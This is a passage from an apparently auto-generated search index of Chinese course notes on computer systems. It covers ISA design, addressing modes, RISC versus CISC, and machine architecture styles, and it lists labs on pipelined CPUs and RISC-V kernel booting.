\u6307\u4ee4\u4e2d\u4e0d\u9700\u8981\u5b58\u50a8\u5668 \u4e00\u822c\u6307\u4ee4\u6709\u4e09\u4e2a\u64cd\u4f5c\u6570 \u4f18\u70b9 \u7b80\u5355\u3001\u5b9a\u957f\u7684\u6307\u4ee4\u7f16\u7801 \u6307\u4ee4\u8fd0\u884c\u7684\u65f6\u95f4\u53d8\u5316\u5c0f \u6613\u4e8e\u8fdb\u884c\u6d41\u6c34\u7ebf \u7f3a\u70b9 \u6307\u4ee4\u4e2a\u6570\u591a \u5e76\u4e0d\u662f\u6240\u6709\u64cd\u4f5c\u90fd\u6709\u4e09\u4e2a\u64cd\u4f5c\u6570 \u9700\u8981\u66f4\u597d\u7684\u7f16\u8bd1\u5668 \u4f8b\u5b50\uff1aCDC6600\u3001CRAY-1\u3001\u5927\u90e8\u5206 RISC \u5bc4\u5b58\u5668\u7684\u4f18\u7f3a\u70b9 \u4f18\u70b9 \u6bd4\u5b58\u50a8\u5668\u8bfb\u5199\u66f4\u5feb \u66f4\u660e\u786e \u9700\u8981\u66f4\u5c11\u6bd4\u7279\u5c31\u80fd\u5b9a\u4f4d\u4f7f\u7528\u54ea\u4e2a\u5bc4\u5b58\u5668 \u8282\u7701\u5185\u5b58\u8bfb\u5199 \u7f3a\u70b9 \u5728\u8fdb\u884c\u8fc7\u7a0b\u8c03\u7528\u7684\u65f6\u5019\u9700\u8981\u4fdd\u62a4\u5bc4\u5b58\u5668\uff08\u5b58\u50a8/\u6062\u590d\uff09 \u4e0d\u80fd\u53d6\u4e00\u4e2a\u5bc4\u5b58\u5668\u7684\u5730\u5740 \u5bc4\u5b58\u5668\u53ef\u5b58\u50a8\u7684\u957f\u5ea6\u56fa\u5b9a \u7f16\u8bd1\u5668\u9700\u8981\u66f4\u597d\u7684\u7ba1\u7406\u5bc4\u5b58\u5668 \u5bc4\u5b58\u5668\u4e2a\u6570\u6709\u9650 RISC-V ISA \u00b6 \u89c1 RISC-V ISA","title":"\u6307\u4ee4\u96c6\u4f53\u7cfb\u7ed3\u6784"},{"location":"cs/system/cs1/topic5/#_1","text":"Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 \u7b2c\u5341\u4e00\uff5e\u5341\u4e8c\u5468\u8bfe\u7a0b\u5185\u5bb9 \u53c2\u8003\uff1a \u903b\u8f91\u4e0e\u8ba1\u7b97\u673a\u8bbe\u8ba1\u57fa\u7840\uff08\u7b2c\u4e94\u7248\uff09 \u7b2c\u4e5d\u7ae0\u3001\u6307\u4ee4\u96c6\u4f53\u7cfb\u7ed3\u6784","title":"\u6307\u4ee4\u96c6\u4f53\u7cfb\u7ed3\u6784"},{"location":"cs/system/cs1/topic5/#isa","text":"","title":"ISA \u6982\u5ff5"},{"location":"cs/system/cs1/topic5/#_2","text":"\u6307\u4ee4\uff08instruction\uff09= \u64cd\u4f5c\u7b26\uff08opcode\uff09+ \u64cd\u4f5c\u6570\uff08operand\uff09 \u6307\u4ee4\u683c\u5f0f\u5305\u542b\u957f\u5ea6\u3001\u64cd\u4f5c\u6570\u4e2a\u6570\u3001\u5bc4\u5b58\u5668\u4e2a\u6570\u3001\u5bfb\u5740\u5185\u5b58\u5927\u5c0f\u3001\u5bfb\u5740\u6a21\u5f0f\u7b49","title":"\u6307\u4ee4"},{"location":"cs/system/cs1/topic5/#_3","text":"CPU \u53ef\u4ee5\u201c\u7406\u89e3\u201d\u7684\u4e00\u7cfb\u5217\u6307\u4ee4\uff0c\u4ee5\u4e8c\u8fdb\u5236\u673a\u5668\u7801\uff08machine code\uff09\u7684\u5f62\u5f0f\u8868\u73b0","title":"\u6307\u4ee4\u96c6"},{"location":"cs/system/cs1/topic5/#_4","text":"\u89c4\u5b9a\u4e86\u6240\u6709\u786c\u4ef6\u5b9e\u73b0\u7684\u6307\u4ee4\u3001\u89c4\u5b9a\u4e86\u6307\u4ee4\u7b26\u53f7\u540d\u79f0\u3001\u4e8c\u8fdb\u5236\u7f16\u7801\u683c\u5f0f\uff0c\u63d0\u4f9b\u4e86\u6bcf\u6761\u6307\u4ee4\u7cbe\u786e\u5b9a\u4e49\u7684\u201d\u624b\u518c\u201c\u5373\u6307\u4ee4\u96c6\u4f53\u7cfb\u7ed3\u6784\uff08ISA\uff0cInstruction Set Architecture\uff09 \u8ba1\u7b97\u673a\u6839\u636e ISA \u5b9e\u73b0\uff0cISA \u53ef\u4ee5\u6709\u591a\u79cd\u5b9e\u73b0\u3001ISA \u4f7f\u8f6f\u4ef6\u53ef\u4ee5\u64cd\u7eb5\u786c\u4ef6\u3001ISA \u5b9a\u4e49\u4e86\u673a\u5668\u8bed\u8a00\uff0cISA \u89c4\u5b9a\u4e86\u5fae\u5904\u7406\u5668\uff08microprocessor\uff09\u7684\u8bbe\u8ba1\uff08ISA \u5b9a\u4e49\u4e86 CPU \u6216\u8005\u4e00\u7c7b CPU\uff0c\u5b83\u5305\u542b CPU \u7684\u5185\u5b58\u89c6\u56fe\u3001\u5bc4\u5b58\u5668\u4e2a\u6570\u7b49\u4fe1\u606f\uff0c\u800c\u4e0d\u53ea\u662f\u4e00\u7cfb\u5217\u6307\u4ee4\u7684\u96c6\u5408\uff09 \u6ce8\uff1a\u4f53\u7cfb\u7ed3\u6784\u8986\u76d6\u6574\u4e2a\u8ba1\u7b97\u673a\uff0c\u5305\u62ec ISA\u3001\u7ec4\u6210\u548c\u786c\u4ef6\uff0c\u800c\u4e0d\u4ec5\u4ec5\u662f ISA\u3002ISA \u4e5f\u4e0d\u662f CPU \u7684\u4f53\u7cfb\u7ed3\u6784\uff08\u540c\u4e00 ISA \u6709\u4e0d\u540c\u79cd CPU\uff09","title":"\u6307\u4ee4\u96c6\u4f53\u7cfb\u7ed3\u6784"},{"location":"cs/system/cs1/topic5/#isa_1","text":"","title":"ISA \u8bbe\u8ba1"},{"location":"cs/system/cs1/topic5/#_5","text":"","title":"\u8bbe\u8ba1\u539f\u5219"},{"location":"cs/system/cs1/topic5/#_6","text":"\u6307\u4ee4\u957f\u5ea6\u8981\u77ed \u4e3a\u65b0\u7684 opcode \u7559\u51fa\u8db3\u591f\u7a7a\u95f4 \u6709\u533a\u5206\u6027\u7684\u7f16\u7801 \u8bbe\u8ba1\u597d\u64cd\u4f5c\u6570\u7684\u4e2a\u6570 \u8bbe\u8ba1\u597d\u6307\u4ee4\u7684\u5bf9\u9f50\u6a21\u5f0f \u4fdd\u6301\u89c4\u8303\u5316","title":"\u6307\u4ee4\u683c\u5f0f\u8bbe\u8ba1\u539f\u5219"},{"location":"cs/system/cs1/topic5/#isa_2","text":"Simplicity favors regularity Make the common case fast Smaller is faster Good design demands good compromises","title":"ISA \u8bbe\u8ba1\u539f\u5219"},{"location":"cs/system/cs1/topic5/#_7","text":"","title":"\u64cd\u4f5c\u6570"},{"location":"cs/system/cs1/topic5/#_8","text":"\u4e00\u822c\u6ca1\u6709 4 \u4e2a\u6216\u4ee5\u4e0a\u64cd\u4f5c\u6570\u7684\u6307\u4ee4\uff0c\u8fd9\u6837\u6bcf\u4e2a\u64cd\u4f5c\u6570\u4e0d\u4e00\u5b9a\u90fd\u4f1a\u7528\u4e0a\uff0c\u800c\u4e14\u4f1a\u589e\u52a0 CPU \u7684\u590d\u6742\u5ea6\uff0c\u5e76\u4e14\u4f7f\u6307\u4ee4\u53d8\u957f \u5927\u90e8\u5206\u6307\u4ee4\u96c6\u5747\u6709 0/1/2/3 \u4e2a\u64cd\u4f5c\u6570\u3002\u4e0b\u9762\u4ee5\u8ba1\u7b97 Y = (A - B) / (C + (D * E)) \u4e3a\u4f8b\u5b50","title":"\u64cd\u4f5c\u6570\u4e2a\u6570"},{"location":"cs/system/cs1/topic5/#_13","text":"\u5728\u6307\u4ee4\u6267\u884c\u7684\u8fc7\u7a0b\u4e2d\uff0c\u5982\u4f55\u83b7\u53d6\u64cd\u4f5c\u6570\u53d6\u51b3\u4e8e\u6307\u4ee4\u7684\u5bfb\u5740\u6a21\u5f0f\u3002\u5bfb\u5740\u6a21\u5f0f\u6307\u5b9a\u4e86\u4e00\u4e2a\u5728\u5b9e\u9645\u8bbf\u95ee\u64cd\u4f5c\u6570\u4e4b\u524d\uff0c\u89e3\u91ca\u6216\u8c03\u6574\u6307\u4ee4\u5730\u5740\u5b57\u6bb5\u7684\u89c4\u5219\uff0c\u7528\u8fd9\u4e2a\u89c4\u5219\u53ef\u4ee5\u751f\u6210\u64cd\u4f5c\u6570\u7684\u6709\u6548\u5730\u5740\uff08effective address\uff09\u3002 \u5bfb\u5740\u6a21\u5f0f\u53ef\u4ee5\u6307\u5b9a\u5230\u5e38\u6570\u3001\u5bc4\u5b58\u5668\u548c\u5185\u5b58\u5730\u5740\u3002\u9ad8\u6548\u7684\u5bfb\u5740\u6a21\u5f0f\u8bbe\u8ba1\u53ef\u4ee5\u51cf\u5c11\u6307\u4ee4\u7684\u957f\u5ea6\u3002\u4e0b\u9762\u662f\u4e00\u4e9b\u5e38\u89c1\u7684\u5bfb\u5740\u6a21\u5f0f","title":"\u5bfb\u5740\u6a21\u5f0f"},{"location":"cs/system/cs1/topic5/#_14","text":"\u7acb\u5373\u6570\u5bfb\u5740\uff08immediate addressing\uff09\u5373\u64cd\u4f5c\u6570\u5c31\u5728\u6307\u4ee4\u5f53\u4e2d\uff0c\u4e5f\u5c31\u662f\u6307\u4ee4\u4e2d\u6709\u4e00\u4e2a\u64cd\u4f5c\u6570\u5b57\u6bb5\u5c31\u4ee3\u8868\u4e86\u8fd9\u4e2a\u5e38\u6570\u672c\u8eab\u800c\u4e0d\u662f\u5730\u5740\u3002","title":"\u7acb\u5373\u6570\u5bfb\u5740"},{"location":"cs/system/cs1/topic5/#_15","text":"\u76f4\u63a5\u5bfb\u5740\uff08direct addressing\uff09\u5373\u64cd\u4f5c\u6570\u4f5c\u4e3a\u5185\u5b58\u5730\u5740\uff0c\u76f4\u63a5\u8bfb\u53d6\u8be5\u5730\u5740\u5904\u7684\u503c\u8fdb\u884c\u64cd\u4f5c\uff0c\u4e5f\u5c31\u662f\u6307\u4ee4\u4e2d\u6709 ADRS\uff0c\u4f46\u5b9e\u9645\u7528\u7684\u662f M[ADRS] \u8fd9\u5c31\u6709\u4e86\u4e00\u4e2a\u95ee\u9898\uff0c\u5982\u679c\u662f 32 \u4f4d\u7684\u5730\u5740\uff0c\u6307\u4ee4\u4e5f\u662f 32 \u4f4d\u7684\uff0c\u4e0d\u80fd\u653e\u4e0b\u5b8c\u6574\u7684\u5730\u5740\uff0c\u6240\u4ee5\u4e00\u822c\u4f7f\u7528\u6bb5\u5730\u5740\u548c\u504f\u79fb\u5730\u5740\u914d\u5408\uff0c\u9690\u542b\u4e00\u4e2a\u6bb5\u5730\u5740\uff0c\u7136\u540e ADRS \u4ec5\u4f7f\u7528\u504f\u79fb\u5730\u5740\u3002\u4f46\u662f\u76f4\u63a5\u5bfb\u5740\u9700\u8981\u5728\u6c47\u7f16\u7684\u65f6\u5019\u5c31\u77e5\u9053\u51c6\u786e\u7684\u5730\u5740\u4f4d\u7f6e \u76f4\u63a5\u5bfb\u5740\u7684\u5730\u5740\u4e5f\u53ef\u4ee5\u4ee3\u8868\u4e00\u4e2a\u5bc4\u5b58\u5668","title":"\u76f4\u63a5\u5bfb\u5740"},{"location":"cs/system/cs1/topic5/#_16","text":"\u95f4\u63a5\u5bfb\u5740\uff08indire addressing\uff09\u5373\u64cd\u4f5c\u6570\u4e2d\u5305\u542b\u5185\u5b58\u5730\u5740\uff0c\u8fd9\u4e2a\u5185\u5b58\u5730\u5740\u5904\u7684\u503c\u8fd8\u662f\u4e00\u4e2a\u5730\u5740\uff0c\u8fd9\u4e2a\u5730\u5740\u6240\u6307\u5411\u7684\u4f4d\u7f6e\u662f\u5b9e\u9645\u8981\u7528\u7684\u6570\u3002\u4e5f\u5c31\u662f\u6307\u4ee4\u4e2d\u6709 ADRS\uff0c\u4f46\u5b9e\u9645\u7528\u7684\u662f M[M[ADRS]] ADRS \u5fc5\u987b\u5728\u6c47\u7f16\u7684\u65f6\u5019\u56fa\u5b9a\uff0c\u4f46\u662f ADRS \u6240\u6307\u5411\u7684\u4f4d\u7f6e\u53ef\u4ee5\u662f\u53d8\u5316\u7684\uff0c\u8fd9\u6837\u53ef\u4ee5\u4f7f\u8bbf\u95ee\u6570\u7ec4\u8fd9\u6837\u7684\u64cd\u4f5c\u53d8\u5f97\u66f4\u65b9\u4fbf ADRS \u4e5f\u53ef\u4ee5\u662f\u4e00\u4e2a\u5bc4\u5b58\u5668","title":"\u95f4\u63a5\u5bfb\u5740"},{"location":"cs/system/cs1/topic5/#_17","text":"\u4e8c\u8005\u5f88\u76f8\u4f3c\uff0c\u90fd\u662f\u5c06\u5bc4\u5b58\u5668\u503c\u4e0e\u5730\u5740\u52a0\u8d77\u6765\u7684\u548c\u4f5c\u4e3a\u5b9e\u9645\u8981\u8bbf\u95ee\u7684\u5730\u5740 \u53d8\u5740\u5bfb\u5740\uff08indexed addressing\uff09\uff0c\u5bc4\u5b58\u5668\u4fdd\u5b58\u7684\u662f\u504f\u79fb\u5730\u5740\uff0c\u6307\u4ee4\u4e2d\u5730\u5740\u4fdd\u5b58\u7684\u662f\u57fa\u5730\u5740 \u57fa\u5740\u5bfb\u5740\uff08based addressing\uff09\uff0c\u5bc4\u5b58\u5668\u4fdd\u5b58\u7684\u662f\u57fa\u5730\u5740\uff0c\u6307\u4ee4\u4e2d\u5730\u5740\u662f\u504f\u79fb\u5730\u5740 \u603b\u7ed3\uff1a \u5bfb\u5740\u6a21\u5f0f \u8868\u793a\u6cd5 \u542b\u4e49 \u7acb\u5373\u6570\u5bfb\u5740 #K K \u76f4\u63a5\u5bfb\u5740 K M[K] \u95f4\u63a5\u5bfb\u5740 (K) M[M[K]] \u5bc4\u5b58\u5668\u5bfb\u5740 (Rn) M[Rn] \u5bc4\u5b58\u5668\u53d8\u5740\u5bfb\u5740 (Rm+Rn) M[Rm+Rn] \u5bc4\u5b58\u5668\u57fa\u5740\u5bfb\u5740 (Rm+X) M[Rm+X] \u5bc4\u5b58\u5668\u57fa\u5740\u53d8\u5740\u5bfb\u5740 (Rm+Rn+X) M[Rm+Rn+X]","title":"\u53d8\u5740\u5bfb\u5740\u4e0e\u57fa\u5740\u5bfb\u5740"},{"location":"cs/system/cs1/topic5/#_18","text":"","title":"\u64cd\u4f5c\u7c7b\u578b\u53ca\u7f16\u7801"},{"location":"cs/system/cs1/topic5/#_19","text":"\u4e00\u822c\u7684\u6307\u4ee4\u96c6\u90fd\u5305\u542b\u4e0b\u9762\u8fd9\u4e9b\u79cd\u64cd\u4f5c\u7c7b\u578b\uff1a \u7b97\u6570\u8fd0\u7b97\u3001\u903b\u8f91\u8fd0\u7b97 \u79fb\u4f4d\u8fd0\u7b97 \u6570\u636e\u4f20\u9001\uff08MOV/LOAD/STORE \u4e4b\u7c7b\uff09 \u5b57\u7b26\u4e32\u8fd0\u7b97 \u63a7\u5236\u6d41\u53d8\u5316\uff08BRANCH/JMP/CALL/RET \u7b49\uff09 \u7cfb\u7edf\u6307\u4ee4\uff08HALT/INT \u7b49\uff09 \u8f93\u5165\u8f93\u51fa ...","title":"\u64cd\u4f5c\u7c7b\u578b"},{"location":"cs/system/cs1/topic5/#_20","text":"\u6307\u4ee4\u7f16\u7801\u7684\u957f\u5ea6\u6709\u51e0\u79cd \u53d8\u957f\uff08Variable\uff09\uff1a\u6bcf\u6761\u6307\u4ee4\u7684\u957f\u5ea6\u90fd\u4e0d\u4e00\u5b9a \u5b9a\u957f\uff08Fixed\uff09\uff1a\u6240\u6709\u6307\u4ee4\u90fd\u662f\u540c\u4e00\u957f\u5ea6 \u6df7\u5408\uff08Hybrid\uff09\uff1a\u6709\u591a\u79cd\u6307\u4ee4\u7684\u957f\u5ea6 \u4e00\u822c\u5982\u679c\u4ee3\u7801\u7684\u5927\u5c0f\u6700\u91cd\u8981\u7684\u8bdd\u9009\u62e9\u53d8\u957f\u6307\u4ee4\uff0c\u5982\u679c\u662f\u6267\u884c\u8868\u73b0\u6700\u91cd\u8981\u7684\u8bdd\u9009\u62e9\u5b9a\u957f\u6307\u4ee4\u3002\u800c\u4e00\u4e9b\u4e3a\u4e86\u517c\u5bb9\uff0c\u53ef\u80fd\u4f1a\u9009\u62e9\u6df7\u5408\u957f\u5ea6\u6307\u4ee4","title":"\u6307\u4ee4\u7f16\u7801"},{"location":"cs/system/cs1/topic5/#risc-cisc","text":"","title":"RISC \u4e0e CISC"},{"location":"cs/system/cs1/topic5/#cisc","text":"CISC\uff08Complex Instruction Set Computer\uff09\u5373\u590d\u6742\u6307\u4ee4\u96c6\u8ba1\u7b97\u673a \u7f16\u7a0b\u548c\u6267\u884c\u4e4b\u95f4\u7684\u8bed\u4e49\u95f4\u9694\uff08semantic gap\uff09\u5c0f \u7a0b\u5e8f\u673a\u5668\u7801\u4f53\u79ef\u5c0f \u7f16\u8bd1\u8fc7\u7a0b\u7b80\u5355 CISC \u7c7b\u578b\u7684\u6307\u4ee4\u96c6\u4f53\u7cfb\u7ed3\u6784\u6709 x86\u3001Intel 432\u3001IBM 360\u3001DEC VAX \u7b49","title":"CISC"},{"location":"cs/system/cs1/topic5/#risc","text":"RISC\uff08Reduced Instruction Set Computer\uff09\u5373\u7cbe\u7b80\u6307\u4ee4\u96c6\u8ba1\u7b97\u673a \u7531 IBM \u53d1\u660e RISC \u7684\u6307\u4ee4\u5f88\u5c11\uff0c\u800c\u4e14\u6bcf\u4e2a\u6307\u4ee4\u7b80\u5355\uff0c\u957f\u5ea6\u56fa\u5b9a CISC \u6bcf\u589e\u52a0\u4e00\u4e2a\u6307\u4ee4\u90fd\u4f1a\u4f7f\u89e3\u7801\u53d8\u6162\uff0c\u4ece\u800c\u4f7f\u6574\u4e2a ISA \u90fd\u4f1a\u53d8\u6162\uff0c\u4f46 RISC \u4e0d\u4f1a \u8fd0\u7b97\u7684\u64cd\u4f5c\u6570\u90fd\u662f\u5bc4\u5b58\u5668\uff08reg-reg\uff09 \u7f16\u8bd1\u4f1a\u66f4\u590d\u6742 RISC \u7c7b\u578b\u7684\u6307\u4ee4\u96c6\u4f53\u7cfb\u7ed3\u6784\u6709 RISC I\u3001RISC II\u3001MIPS\u3001ARM\u3001RISC V \u7b49 CISC \u4e0e RISC \u533a\u522b\uff1a CISC RISC \u53d8\u957f\u6307\u4ee4 \u5b9a\u957f\u6307\u4ee4 \u5927\u91cf\u6307\u4ee4\u548c\u5bfb\u5740\u6a21\u5f0f \u6307\u4ee4\u548c\u5bfb\u5740\u6a21\u5f0f\u90fd\u5f88\u5c11 \u7f16\u7801\u957f\u3001\u590d\u6742 \u7f16\u7801\u7b80\u5355 \u5305\u542b\u4ece\u5185\u5b58\u5230\u5185\u5b58\u7684\u64cd\u4f5c \u53ea\u80fd\u5b58/\u53d6 \u4f7f\u7528\u5fae\u6307\u4ee4 \u6ca1\u6709\u5fae\u6307\u4ee4\uff0c\u4e00\u5207\u90fd\u76f4\u63a5\u4ece\u6307\u4ee4\u4e2d\u89e3\u7801\u51fa\u6765 \u8bed\u4e49\u95f4\u9694\u5c0f \u9700\u8981\u66f4\u667a\u80fd\u7684\u7f16\u8bd1\u5668 CISC \u548c RISC \u5728\u53d1\u5c55\u4e2d\u4e5f\u4e0d\u5e94\u5b8c\u5168\u5272\u88c2","title":"RISC"},{"location":"cs/system/cs1/topic5/#_21","text":"\u5bfb\u5740\u7ed3\u6784\u6709\u51e0\u79cd\uff1a \u7d2f\u52a0\u5668\u7ed3\u6784\uff0cAccumulator\uff081960 \u524d\uff0c\u5982 68HC11\uff09 \u6808\u7ed3\u6784\uff0cStack\uff081960s ~ 1970s\uff09 \u5b58\u50a8\u5668\u5230\u5b58\u50a8\u5668\u7ed3\u6784\uff0cMemory-Memory\uff081970s ~ 1980s\uff09 \u5bc4\u5b58\u5668\u5230\u5b58\u50a8\u5668\u7ed3\u6784\uff0cRegister-Memory\uff081970s \u81f3\u4eca\uff0c\u5982 x86\uff09 \u5bc4\u5b58\u5668\u5230\u5bc4\u5b58\u5668\u7ed3\u6784\uff0cRegister-Register\uff081960s \u81f3\u4eca\uff0c\u5982 MIPS\uff09\uff0c\u53c8\u79f0\u88c5\u8f7d/\u5b58\u50a8\u7ed3\u6784\uff08Load/Store\uff09","title":"\u5bfb\u5740\u7ed3\u6784"},{"location":"cs/system/cs1/topic5/#_22","text":"ALU \u8fd0\u7b97\u6ca1\u6709\u64cd\u4f5c\u6570\uff0cpush/pop \u6709\u4e00\u4e2a\u64cd\u4f5c\u6570 \u4f18\u70b9 \u6307\u4ee4\u77ed \u786c\u4ef6\u8981\u6c42\u4f4e \u7f16\u8bd1\u5668\u597d\u5199 \u7f3a\u70b9 \u6548\u7387\u4f4e \u6808\u7a7a\u95f4\u6709\u9650 \u5e76\u884c\u6216\u6d41\u6c34\u7ebf\u80fd\u529b\u5f31 \u7f16\u8bd1\u5668\u96be\u4f18\u5316 \u4f8b\u5b50\uff1a60 \u5e74\u4ee3\u7684 B5500/6500 HP3000/70\uff0c\u73b0\u5728\u7684 Java \u865a\u62df\u673a","title":"\u6808\u7ed3\u6784"},{"location":"cs/system/cs1/topic5/#_23","text":"\u4f7f\u7528\u5355\u4e2a\u64cd\u4f5c\u6570\uff08\u4e00\u4e2a\u663e\u5f0f\u4e00\u4e2a\u9690\u542b\uff09 \u6307\u4ee4\u6709 ALU \u8fd0\u7b97\u3001\u52a0\u8f7d\u5230\u7d2f\u52a0\u5668\u3001\u4ece\u7d2f\u52a0\u5668\u8f93\u51fa\u5230\u5b58\u50a8\u5668 \u4f18\u70b9 \u786c\u4ef6\u8981\u6c42\u6781\u4f4e \u6613\u4e8e\u8bbe\u8ba1\u3001\u7406\u89e3 \u7f3a\u70b9 \u7d2f\u52a0\u5668\u6210\u4e3a\u74f6\u9888 \u5e76\u884c/\u6d41\u6c34\u7ebf\u80fd\u529b\u5f31 \u9700\u8981\u7684 load store \u5f88\u591a\uff0c\u5185\u5b58\u8bfb\u5199\u9891\u7e41 \u4f8b\u5b50\uff1a\u65e9\u671f IBM 7090 \u7b49\uff0c\u73b0\u5728\u7684 DSP \u7ed3\u6784","title":"\u7d2f\u52a0\u5668\u7ed3\u6784"},{"location":"cs/system/cs1/topic5/#_24","text":"\u6240\u6709\u7684 ALU \u8fd0\u7b97\u90fd\u4ece\u5b58\u50a8\u5668\u8bfb\u5199 \u4f18\u70b9 \u65e0\u9700\u4f7f\u7528\u5bc4\u5b58\u5668 \u9700\u8981\u7684\u6307\u4ee4\u6570\u91cf\u5c11 \u5bb9\u6613\u5199\u7f16\u8bd1\u5668 \u7f3a\u70b9 \u6307\u4ee4\u957f\u5ea6\u53d8\u5316\u5927 \u6bcf\u6761\u6307\u4ee4\u6267\u884c\u7684\u65f6\u95f4\u6d6e\u52a8\u4e5f\u5927 \u5de8\u5927\u7684\u5b58\u50a8\u5668\u8bfb\u5199\u5bfc\u81f4\u6548\u7387\u4f4e \u4f8b\u5b50\uff1aVAX","title":"\u5b58\u50a8\u5668\u5230\u5b58\u50a8\u5668\u7ed3\u6784"},{"location":"cs/system/cs1/topic5/#_25","text":"ALU \u64cd\u4f5c\u4e2d\u6709\u4e00\u4e2a\u5b58\u50a8\u5668 \u4e00\u822c\u6307\u4ee4\u6709\u4e24\u4e2a\u64cd\u4f5c\u6570 \u4f18\u70b9 \u6307\u4ee4\u6570\u91cf\u5c11 \u6307\u4ee4\u6613\u4e8e\u7f16\u89e3\u7801 \u7f3a\u70b9 \u8fd0\u7b97\u7ed3\u679c\u4f1a\u8986\u76d6\u539f\u503c \u6307\u4ee4\u957f\u5ea6\u53d8\u5316\u5927 \u6307\u4ee4\u8fd0\u884c\u65f6\u95f4\u53d8\u5316\u5927 \u53ef\u80fd\u4f1a\u9650\u5236\u5bc4\u5b58\u5668\u4e2a\u6570 \u4f8b\u5b50\uff1aIBM 360/370\u3001VAX","title":"\u5bc4\u5b58\u5668\u5230\u5b58\u50a8\u5668\u7ed3\u6784"},{"location":"cs/system/cs1/topic5/#_26","text":"ALU \u6307\u4ee4\u4e2d\u4e0d\u9700\u8981\u5b58\u50a8\u5668 \u4e00\u822c\u6307\u4ee4\u6709\u4e09\u4e2a\u64cd\u4f5c\u6570 \u4f18\u70b9 \u7b80\u5355\u3001\u5b9a\u957f\u7684\u6307\u4ee4\u7f16\u7801 \u6307\u4ee4\u8fd0\u884c\u7684\u65f6\u95f4\u53d8\u5316\u5c0f \u6613\u4e8e\u8fdb\u884c\u6d41\u6c34\u7ebf \u7f3a\u70b9 \u6307\u4ee4\u4e2a\u6570\u591a \u5e76\u4e0d\u662f\u6240\u6709\u64cd\u4f5c\u90fd\u6709\u4e09\u4e2a\u64cd\u4f5c\u6570 \u9700\u8981\u66f4\u597d\u7684\u7f16\u8bd1\u5668 \u4f8b\u5b50\uff1aCDC6600\u3001CRAY-1\u3001\u5927\u90e8\u5206 RISC \u5bc4\u5b58\u5668\u7684\u4f18\u7f3a\u70b9 \u4f18\u70b9 \u6bd4\u5b58\u50a8\u5668\u8bfb\u5199\u66f4\u5feb \u66f4\u660e\u786e \u9700\u8981\u66f4\u5c11\u6bd4\u7279\u5c31\u80fd\u5b9a\u4f4d\u4f7f\u7528\u54ea\u4e2a\u5bc4\u5b58\u5668 \u8282\u7701\u5185\u5b58\u8bfb\u5199 \u7f3a\u70b9 \u5728\u8fdb\u884c\u8fc7\u7a0b\u8c03\u7528\u7684\u65f6\u5019\u9700\u8981\u4fdd\u62a4\u5bc4\u5b58\u5668\uff08\u5b58\u50a8/\u6062\u590d\uff09 \u4e0d\u80fd\u53d6\u4e00\u4e2a\u5bc4\u5b58\u5668\u7684\u5730\u5740 \u5bc4\u5b58\u5668\u53ef\u5b58\u50a8\u7684\u957f\u5ea6\u56fa\u5b9a \u7f16\u8bd1\u5668\u9700\u8981\u66f4\u597d\u7684\u7ba1\u7406\u5bc4\u5b58\u5668 \u5bc4\u5b58\u5668\u4e2a\u6570\u6709\u9650","title":"\u88c5\u8f7d/\u5b58\u50a8\u7ed3\u6784"},{"location":"cs/system/cs1/topic5/#risc-v-isa","text":"\u89c1 RISC-V ISA","title":"RISC-V ISA"},{"location":"cs/system/cs1/topic6/","text":"\u5904\u7406\u5668 \u00b6 Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 \u7b2c\u5341\u4e09\uff5e\uff1f\u5468\u8bfe\u7a0b\u5185\u5bb9 \u53c2\u8003\uff1a","title":"\u5904\u7406\u5668"},{"location":"cs/system/cs1/topic6/#_1","text":"Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 \u7b2c\u5341\u4e09\uff5e\uff1f\u5468\u8bfe\u7a0b\u5185\u5bb9 \u53c2\u8003\uff1a","title":"\u5904\u7406\u5668"},{"location":"cs/system/cs2/","text":"\u8ba1\u7b97\u673a\u7cfb\u7edf \u2161 \u00b6 Abstract \u6d59\u6c5f\u5927\u5b66 \u201c\u8ba1\u7b97\u673a\u7cfb\u7edf \u2161\u201d \u8bfe\u7a0b\u53ca\u76f8\u5173\u77e5\u8bc6\u7b14\u8bb0 \u5173\u4e8e \u8ba1\u7b97\u673a\u7cfb\u7edf \u2161\uff1a \u8bfe\u7a0b\u53f7\uff1a21121840 \u4fe1\u606f\u5b89\u5168\u4e13\u4e1a\u5fc5\u4fee\u8bfe \u5305\u542b \u5e38\u89c4\u610f\u4e49 \u4e0a\u7684 \u8ba1\u7b97\u673a\u7ec4\u6210\u4e0e\u8bbe\u8ba1 \u548c \u64cd\u4f5c\u7cfb\u7edf \u4e24\u95e8\u8bfe\u7684\u90e8\u5206\u5185\u5bb9 Table of Contents \u00b6 \u7406\u8bba\u90e8\u5206 \u6d41\u6c34\u7ebf CPU \u5b9e\u9a8c\u90e8\u5206 lab1: \u6d41\u6c34\u7ebf CPU \u8bbe\u8ba1 lab2: \u6d41\u6c34\u7ebf\u5192\u9669\u5904\u7406 lab3: GDB+QEMU \u8c03\u8bd5 64 \u4f4d RISC-V LINUX lab4: RV64 \u5185\u6838\u5f15\u5bfc","title":"\u8ba1\u7b97\u673a\u7cfb\u7edf \u2161"},{"location":"cs/system/cs2/#ii","text":"Abstract \u6d59\u6c5f\u5927\u5b66 \u201c\u8ba1\u7b97\u673a\u7cfb\u7edf \u2161\u201d \u8bfe\u7a0b\u53ca\u76f8\u5173\u77e5\u8bc6\u7b14\u8bb0 \u5173\u4e8e \u8ba1\u7b97\u673a\u7cfb\u7edf \u2161\uff1a \u8bfe\u7a0b\u53f7\uff1a21121840 \u4fe1\u606f\u5b89\u5168\u4e13\u4e1a\u5fc5\u4fee\u8bfe \u5305\u542b \u5e38\u89c4\u610f\u4e49 \u4e0a\u7684 \u8ba1\u7b97\u673a\u7ec4\u6210\u4e0e\u8bbe\u8ba1 \u548c \u64cd\u4f5c\u7cfb\u7edf \u4e24\u95e8\u8bfe\u7684\u90e8\u5206\u5185\u5bb9","title":"\u8ba1\u7b97\u673a\u7cfb\u7edf \u2161"},{"location":"cs/system/cs2/#table-of-contents","text":"\u7406\u8bba\u90e8\u5206 \u6d41\u6c34\u7ebf CPU \u5b9e\u9a8c\u90e8\u5206 lab1: \u6d41\u6c34\u7ebf CPU \u8bbe\u8ba1 lab2: \u6d41\u6c34\u7ebf\u5192\u9669\u5904\u7406 lab3: GDB+QEMU \u8c03\u8bd5 64 \u4f4d RISC-V LINUX lab4: RV64 \u5185\u6838\u5f15\u5bfc","title":"Table of Contents"},{"location":"cs/system/cs2/lab1/","text":"\u6d41\u6c34\u7ebf CPU \u8bbe\u8ba1 \u00b6 Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2161 lab1 